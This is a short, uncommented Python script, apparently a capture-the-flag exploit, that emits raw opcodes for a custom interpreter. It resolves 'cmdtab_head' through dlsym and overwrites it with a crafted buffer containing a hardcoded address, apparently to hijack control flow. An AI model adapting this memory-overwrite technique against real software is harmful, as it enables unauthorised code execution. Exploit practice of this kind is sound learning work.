#!/usr/bin/env python
from struct import *
import sys

def writestack(fourbytes):
	sys.stdout.write("\xAF\x00\x00"+fourbytes)

def dlopen():
	sys.stdout.write("\x4D\x00\x00")

def dlsym():
	sys.stdout.write("\xB4\x00\x00")

def sub():
	sys.stdout.write("\x46\x00\x00")

def writenull():
	sys.stdout.write("\x31\x00\x00")

def loopin():
	sys.stdout.write("\x18\x00\x00")

def writefile():
	sys.stdout.write("\x23\x00\x00")

def writemem():
	sys.stdout.write("\xB0\x00\x00")

def unregister():
	sys.stdout.write("\x95\x00\x00")

def writeheap(string):
	sys.stdout.write("\xEA" + pack("<H", len(string)) + string)


#writeheap("/tmp/test")
#writeheap("testtest12")
#writestack(pack("<I", 10))
#writefile()


writeheap("")
dlopen()
#writestack(pack("<I",0x21788))
writeheap("cmdtab_head\x00")
dlsym()
writeheap("EQEQZZZZ\xc0\x41\x8f\xb7PPPPNNNN")
#writenull()
#sub()
#writestack("BBBB")
writemem()
#dlsym()
